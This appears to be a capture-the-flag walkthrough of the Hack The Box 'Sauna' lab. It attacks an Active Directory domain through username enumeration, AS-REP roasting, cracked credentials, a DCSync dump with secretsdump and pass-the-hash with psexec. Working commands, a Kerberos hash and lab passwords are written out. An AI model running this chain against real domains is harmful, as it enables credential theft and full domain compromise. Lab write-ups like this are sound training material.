---
title: "HTB - Sauna"
date: 2026-03-05
platform: "HTB"
difficulty: "Easy"
tags: ["Active Directory", "AS-REP Roasting", "Username Anarchy"]
summary: "Username enumeration and AS-REP Roasting to gain initial access, then privilege escalation via service account abuse."
---

IP: 10.129.95.180

# Recon
## Port Scanning
![[1.png]]

![[2.png]]

Enumerating LDAP with windapsearch, we observe that anonymous binds are allowed.

![[3.png]]


FootHold
We can use a tool such as Username Anarchy(https://github.com/urbanadventurer/username-anarchy) to create common username permutations based
on the full names. After saving the full names to a text file, we run the script.
==./username-anarchy --input-file /home/kali/Desktop/HTB/sauna/fullname.txt first,flast,first.last,firstl > /home/kali/Desktop/HTB/sauna/username.txt==

while read p; do impacket-GetNPUsers egotistical-bank.local/"$p" -request -no-pass -dc-ip 10.129.95.180 >> hash.txt; done < username.txt  

![[4.png]][*] Getting TGT for fsmith
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc6d98759d60bca8e93d5ca384da8e02$469ac06c2194776a82a0cca026071464643dc049ea7a1e03124b99cc12abf5f47d2da13966a55c009cd3192be4d5b6f524f610cd1784b174fc404d8e95ec7c4f5e44fcd1ce1b7e7287e17278e831c29a2d2743e0cfe4e859014f8b9649a5eebe8f5d8f484cb3469770ed42ab4bf2529eba3ad5b180f7bcfae828f44ea1a3c7e3e7eef2ed60cb2ab53368c216ffa111131f0699dc0a515baf316111ff9daaf5c858f4a35b5346063883ce4685644d87af54513f9a7aadcc3d1e896fc9528732da64ffb5d13ad14b7c36de7c7df88bdba830556fee1845086aa1545921d4a228b98deb67c8a1b285dd07688cb110f682ce02624e60c0cbe88719a37b62c80a5281 

hashcat --help | grep Kerberos

 Got Credentials:
 ==username: fsmith==
 ==password  : Thestrokes23==

![[5.png]]

With the gained, we can try to login using WinRM (port 5985). 


# Privesc

winpeas
![[6.png]]evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'

using bloodhound

sudo pip install bloodhound-python
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.129.95.180 -c All
![[7.png]]
![[8.png]]
SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL is connected with the EGOTISTICAL-BANK.LOCAL node, via the GetChangesAll edge.

impacket-secretsdump egotistical-bank/svc_loanmgr@10.129.95.180 -just-dc-user Administrator
![[8.png]]

impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e